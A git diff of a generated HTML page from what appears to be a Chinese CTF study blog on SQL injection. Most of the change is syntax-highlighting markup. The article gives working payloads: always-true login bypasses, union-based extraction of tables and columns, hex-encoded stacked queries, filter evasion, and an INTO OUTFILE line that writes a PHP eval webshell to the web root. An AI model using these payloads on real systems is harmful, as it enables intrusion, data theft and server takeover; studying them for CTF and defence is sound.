@@ -17,13 +17,6 @@
 <script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
 
 
-<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
-<link
-    rel="stylesheet"
-    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/Github.min.css"
-/>
-<script src="/blog/js/lib/highlight.js"></script>
-
 
 
 <script src="/blog/js/lib/preview.js"></script>
@@ -69,7 +62,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-text">过滤替换</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-text">输入过滤</span></a></li></ol></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -211,7 +204,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #ffa2c4">Web</a>
+                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
             </span>
             
         </span>
@@ -221,18 +214,20 @@
     <div class="content" v-pre>
         <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h1><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
 <p>原型</p>
-<pre><code class="sql">//拼接sql语句查找指定ID用户
-$sql = &quot;select username,password from table_name where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>
+$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from table_name where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
 <p>基本思路</p>
 <p>用<code>1&#39;</code>闭合前面的语句，执行自己构造的语句</p>
 <span id="more"></span>
 
 <h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-tutorial.html">SQL语法</a></h2><ul>
 <li><p>从数据库中选取数据</p>
-<pre><code class="sql">SELECT column_name,column_name FROM table_name;
-SELECT FROM table_name;
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span>
+<span class="token keyword">SELECT</span> <span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <ul>
 <li><p><code>select distinct</code>语句可用于返回唯一不同的值</p>
 </li>
@@ -260,14 +255,14 @@ SELECT FROM table_name;
 </li>
 </ul>
 <h2 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h2><p>原理：使相关语句永真</p>
-<pre><code class="sql">&#39;1&#39;or 1 = 1#
-1&#39;or&#39;1&#39;=&#39;1
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'1'</span><span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token comment">#</span>
+<span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>
 
 此时
-select username,password from user where username !=&#39;flag&#39; and id = &#39;1&#39; or 1=1;
-and优先级&gt;or
-F or T = T
-</code></pre>
+<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token operator">and</span>优先级<span class="token operator">></span><span class="token operator">or</span>
+F <span class="token operator">or</span> T <span class="token operator">=</span> T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><code>ffifdyop</code>：md5加密时使用</p>
 <h2 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h2><h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><ul>
 <li><p>数字型：当输入的参数为整型时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
@@ -285,36 +280,36 @@ F or T = T
 <p>并集查询，可用于前面的语句查不到的情况</p>
 </blockquote>
 <p>语句原型</p>
-<pre><code class="sql">union select column_name,column_name from table_name where column_name=&#39;flag&#39;
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> column_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> table_name <span class="token keyword">where</span> column_name<span class="token operator">=</span><span class="token string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <ul>
 <li><p>步骤</p>
 <p><em>1. 页面观察</em></p>
 <p><em>2. 注入点判断</em></p>
 <p><em>3. 判断当前表的字段个数</em>：</p>
-<pre><code class="sql">?id=1&#39; order by 3 --+
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
-<pre><code class="sql">?id=-1&#39; union select 1,2,3 --+
-//=-1&#39;:(让前面的参数查不出来)
-//1,2,3:(总列数)
-//--+(注释)
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,3 --+
+//=-1'</span>:<span class="token punctuation">(</span>让前面的参数查不出来<span class="token punctuation">)</span>
+<span class="token comment">//1,2,3:(总列数)</span>
+<span class="token comment">//--+(注释)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><em>5. 爆数据库名字</em></p>
-<pre><code class="sql">?id=-1&#39; union select 1,database(),3 --+
-//1:(头列数)
-//3:(尾列数)
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span>
+<span class="token comment">//1:(头列数)</span>
+<span class="token comment">//3:(尾列数)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><em>6. 爆数据库中的表</em></p>
-<pre><code class="sql">?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/&#39;数据库名&#39; --+
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/'</span>数据库名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><em>7. 爆表中的字段</em></p>
-<pre><code class="sql">?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema=&#39;数据库名&#39; and)  table_name=&#39;表名&#39; --+
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema='</span>数据库名<span class="token string">' and)  table_name='</span>表名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><em>8. 爆相应字段的所有数据</em></p>
-<pre><code class="sql">?id=-1&#39; union select 1,group_concat(字段名,&#39;--&#39;,字段名,&#39;--&#39;,字段名),3 from 表名 --+
-</code></pre>
-</li>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(字段名,'</span><span class="token comment">--',字段名,'--',字段名),3 from 表名 --+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <hr>
 <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/123486880?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167946953016800188553547%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167946953016800188553547&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123486880-null-null.142%5Ev76%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1018.2226.3001.4187">布尔盲注</a></h2><blockquote>
@@ -359,8 +354,8 @@ F or T = T
 </ul>
 </li>
 <li><p><strong>编码</strong>(以select * from `1919810931114514`为例)</p>
-<pre><code class="sql">;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>prepare…from…是预处理语句，会进行编码转换</li>
 <li>execute用来执行由SQLPrepare创建的SQL语句</li>
@@ -391,7 +386,7 @@ F or T = T
 </li>
 </ul>
 <hr>
-<h3 id="过滤替换"><a href="#过滤替换" class="headerlink" title="过滤替换"></a>过滤替换</h3><p>空格：<code>/**/、%09、%0a、%0d、%0c、+</code></p>
+<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>空格：<code>/**/</code>、<code>%09</code>、<code>%0a</code>、<code>%0d</code>、<code>%0c</code>、<code>+</code></p>
 <p>等号：like</p>
 <p>单独select: 大写</p>
 <p>select…where…：</p>
@@ -401,44 +396,49 @@ F or T = T
 <li><p>将 select * from 列名 进行16进制编码</p>
 </li>
 <li><p><strong>handler</strong>:一行一行显示库中内容</p>
-<pre><code class="sql">handler tablename open as `a`;(`a`为新创建的表)
-handler tablename read;读出什么输出什么
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> tablename <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span>为新创建的表<span class="token punctuation">)</span>
+<span class="token keyword">handler</span> tablename <span class="token keyword">read</span><span class="token punctuation">;</span>读出什么输出什么
 
-handler tablename read first [where username=‘admin’];
-handler `a` read next [where username=‘admin’]; – [] 中的内容意味着可加可不加
-</code></pre>
-</li>
+<span class="token keyword">handler</span> tablename <span class="token keyword">read</span> <span class="token keyword">first</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <p>单字段过滤：</p>
 <p>16进制编码<code>hex(a.username)</code></p>
 <p>过滤数字：</p>
 <p>用别的字符替换数字然后再转换回去</p>
-<pre><code class="sql">-1&#39;union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;arc&#39;),&#39;2&#39;,&#39;brc&#39;),&#39;3&#39;,&#39;crc&#39;),&#39;4&#39;,&#39;drc&#39;),&#39;5&#39;,&#39;erc&#39;),&#39;6&#39;,&#39;frc&#39;),&#39;7&#39;,&#39;grc&#39;),&#39;8&#39;,&#39;hrc&#39;),&#39;9&#39;,&#39;irc&#39;),&#39;0&#39;,&#39;jrc&#39;),&#39;a&#39; from table_name where username=&#39;flag&#39;--+
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'</span><span class="token number">1</span><span class="token string">','</span>arc<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>brc<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>crc<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>drc<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>erc<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>frc<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>grc<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>hrc<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>irc<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>jrc<span class="token string">'),'</span>a<span class="token string">' from table_name where username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>解密脚本</p>
-<pre><code class="python">flag=&#39;flag&#39;
-#flag表示number
-flag=flag.replace(&#39;arc&#39;,&#39;1&#39;)
-flag=flag.replace(&#39;brc&#39;,&#39;2&#39;)
-flag=flag.replace(&#39;crc&#39;,&#39;3&#39;)
-flag=flag.replace(&#39;drc&#39;,&#39;4&#39;)
-flag=flag.replace(&#39;erc&#39;,&#39;5&#39;)
-flag=flag.replace(&#39;frc&#39;,&#39;6&#39;)
-flag=flag.replace(&#39;grc&#39;,&#39;7&#39;)
-flag=flag.replace(&#39;hrc&#39;,&#39;8&#39;)
-flag=flag.replace(&#39;irc&#39;,&#39;9&#39;)
-flag=flag.replace(&#39;jrc&#39;,&#39;0&#39;)
-print(flag)
-</code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">'flag'</span>
+<span class="token comment">#flag表示number</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'arc'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'brc'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'crc'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'drc'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'erc'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'frc'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'grc'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'hrc'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'irc'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'jrc'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p>过滤ASCll码<code>/[\x00-\x7f]/i</code>：</p>
 <p>文件包含</p>
-<pre><code class="sql">&#39; union select 1,group_concat(password) from table_name into outfile &#39;/var/www/html/1.txt&#39;-- -
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' union select 1,group_concat(password) from table_name into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt<span class="token string">'-- -
 将flag写入1.txt文件中
 
--1&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#39;/var/www/html/1.php
-写入一句话木马(需用base64编码+from_base64() )
-在/var/www/html/api/config.php找到mysql的root的密码
-</code></pre>
+-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span>'<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php
+写入一句话木马<span class="token punctuation">(</span>需用base64编码<span class="token operator">+</span>from_base64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+在<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>api<span class="token operator">/</span>config<span class="token punctuation">.</span>php找到mysql的root的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
 <hr>
 
     </div>
